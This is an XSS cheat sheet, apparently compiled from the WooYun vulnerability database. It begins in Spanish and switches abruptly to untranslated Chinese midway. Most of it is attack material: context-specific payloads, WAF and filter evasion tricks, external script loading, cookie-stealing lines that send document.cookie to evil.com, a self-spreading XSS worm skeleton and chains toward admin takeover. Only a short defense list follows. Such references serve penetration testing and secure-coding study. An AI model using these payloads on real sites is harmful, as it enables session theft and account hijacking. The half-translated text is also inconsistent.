# Seguridad Web - XSS (Cross-Site Scripting)

> Fuente: Base de datos de vulnerabilidades WooYun (7,532 casos de XSS) | Extraído de web-injection.md

## II. XSS (Cross-Site Scripting)

### 2.1 Naturaleza de la vulnerabilidad

```
Entrada del usuario (datos) -> Salida sin codificar -> El navegador la interpreta como código -> Ejecución del script
```

**Fórmula central**: XSS = Ruptura del límite de confianza + Confusión del contexto de salida (el significado de los datos cambia dentro de HTML/JS/CSS/URL)

### 2.2 Métodos de detección

#### Puntos de salida de alto riesgo

| Punto de salida | Condición de activación | Escenario típico |
|-------|---------|---------|
| Apodo/firma de usuario | Carga de página | Página personal, comentarios, lista de amigos |
| Reflejo en cuadro de búsqueda | Operación de búsqueda | Página de resultados de búsqueda |
| Comentarios/mensajes | Visualización de contenido | Foro, blog, reseñas de productos |
| Nombre/descripción de archivo | Lista de archivos | Almacenamiento en la nube, álbum de fotos |
| Cuerpo/asunto del correo | Apertura del correo | Sistema de correo electrónico |
| Notas de pedido | Visualización en backend | Backend de e-commerce, sistema de tickets |

**Puntos de salida ocultos** (fáciles de pasar por alto): cabeceras HTTP (XFF/UA escritos en logs), envío por WAP mostrado en PC, apodo de cliente renderizado en Web, bandeja de borradores/lista de revisión

#### Determinación rápida del contexto

```
¿La salida está dentro de <script>? -> Contexto JS (verificar tipo de comillas)
¿La salida está en un valor de atributo? -> Contexto de atributo (verificar tipo de atributo)
¿La salida está en el contenido de una etiqueta? -> Contexto HTML (verificar etiquetas especiales textarea/title)
¿La salida está en una URL? -> Contexto URL (verificar restricciones de protocolo)
¿La salida está en CSS? -> Contexto CSS (verificar soporte de expression)
```

### 2.3 Payloads por contexto

#### Contenido de etiquetas HTML

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### Valores de atributos HTML

```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### Cadenas de JavaScript

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### Contexto URL

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2.4 Técnicas de evasión de WAF/filtros

#### Evasión mediante codificación

```html
<!-- Entidades HTML -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
<!-- Base64 + protocolo data -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- Codificación CSS (IE) -->
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

#### Deformación de etiquetas/atributos

```html
<ScRiPt>alert(1)</sCrIpT>              <!-- Confusión de mayúsculas/minúsculas -->
<script/src=//xss.com/x.js>            <!-- Barra en lugar de espacio -->
<img src=x onerror=alert(1)>           <!-- Sin comillas -->
<scrscriptipt>alert(1)</scrscriptipt>  <!-- Evasión por doble escritura -->
<scr\x00ipt>alert(1)</script>          <!-- Evasión con carácter nulo -->
```

#### Manejadores de eventos alternativos

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

#### WAF特定绕过

```html
.<script src=http://localhost/1.js>.    <!-- 安全宝：前后加点号 -->
<!--[if true]><img onerror=alert(1) src=--> <!-- 注释干扰 -->
```

#### 长度限制绕过

```html
<script src=//xss.pw/j>                <!-- 最短外部加载 -->
<!-- DOM拼接 -->
<script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
<!-- 字符串拼接绕过关键字 -->
<script>window['al'+'ert'](1)</script>
<!-- fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### HTTPOnly绕过

- Flash接口获取用户信息替代Cookie
- 转为CSRF方式：直接执行敏感操作（改密码、加管理员、读token）

### 2.5 利用链

#### Cookie窃取

```html
<script>new Image().src="https://evil.com/c?="+document.cookie</script>
<img src=x onerror="new Image().src='https://evil.com/c?='+document.cookie">
<script>fetch('https://evil.com/c?='+document.cookie)</script>
```

#### DOM XSS关键源与汇

**危险源**：`location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`

**危险汇**：`innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`

#### XSS蠕虫核心逻辑

```javascript
// 1.获取当前用户身份(cookie/token)
// 2.构造包含自身payload的内容
// 3.自动发布/分享（AJAX POST）
// 4.触发条件：查看/访问即传播
function worm(){
    jQuery.post("/api/post", {"content": "<自传播payload>"})
}
worm()
```

#### 组合利用模式

```
XSS + CSRF -> 获取Token执行管理操作
XSS + SQLi -> 盲打获取Cookie -> 后台注入
XSS -> 账号劫持 -> 权限提升 -> 蠕虫传播
XSS盲打(留言/工单/反馈) -> 获取后台管理员Cookie
```

### 2.6 防御措施

- **输出编码**（核心）：HTML上下文用HTML实体，JS上下文用JS编码，URL上下文用URL编码
- CSP策略限制脚本来源
- HTTPOnly保护Cookie
- 白名单输入验证（避免黑名单，总有遗漏）
- **常见失误**：只过滤script标签、只过滤小写、前端过滤可抓包绕过、单次过滤被双写绕过

---

